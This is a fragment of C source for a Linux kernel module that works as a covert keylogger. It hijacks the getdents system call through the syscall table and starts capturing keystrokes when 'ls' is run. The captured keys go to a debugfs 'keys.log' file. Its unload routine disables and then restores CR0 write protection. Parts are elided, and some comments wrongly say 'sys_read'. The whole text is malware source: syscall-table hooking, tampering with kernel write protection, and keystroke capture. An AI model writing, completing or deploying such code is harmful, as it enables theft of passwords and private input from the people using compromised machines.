...
asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    ...
    // each directory = 24 byte return value
    // each file = 32 byte return value
    int rtn = original_getdents(fd, dirp, count);
    // LIMITATION: CAN ONLY PROC IF LS IS INVOKED IN SOURCE DIRECTORY
    if(globalFlag == 0 && (rtn == 256 || rtn == 568 || rtn == 608 || rtn == 632 || rtn == 640 || rtn == 672)) {    
        register_keyboard_notifier(&keysniffer_blk);
        printk(KERN_ALERT "Keylogging Initiated.\n");
        globalFlag = 1;
    }
...
static int init(void) {
    ...
    original_getdents = (void *)syscall_table[__NR_getdents];  //store original sys_read
    syscall_table[__NR_getdents] = &sys_getdents_hook;  //overwrite sys_read pointer
    ...
    file = debugfs_create_file("keys.log", 0400, subdir, NULL, &keys_fops);
    if (!file) {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    printk(KERN_EMERG "Directory for log file created.\n");


    printk(KERN_EMERG "Hook successful. Awaiting 'ls' command to initiate keylogging.\n");
...
static void out(void) {
    ...
    write_cr0 (read_cr0 () & (~0x10000));  //disable write-protection
    syscall_table[__NR_getdents] = original_getdents;  //overwrite sys_read pointer
    write_cr0 (read_cr0 () | 0x10000);     //reenable write-protection

    printk(KERN_EMERG "Unhook successful.\n");

    // Remove python reader
    // task = "python3 test.py";
    // struct siginfo info;
